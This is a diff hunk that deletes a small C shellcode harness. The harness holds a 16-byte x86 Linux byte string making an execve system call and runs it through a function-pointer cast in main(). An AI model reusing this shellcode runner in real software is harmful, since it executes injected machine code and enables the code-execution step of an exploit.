@@ -1,7 +1,0 @@
-char sc[] = /* 16 bytes */
-"\x31\xc0\xbb\x08\x84\x04\x08\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
- 
-main()
-{
-		    int (*f)() = (int (*)())sc; f();
-}
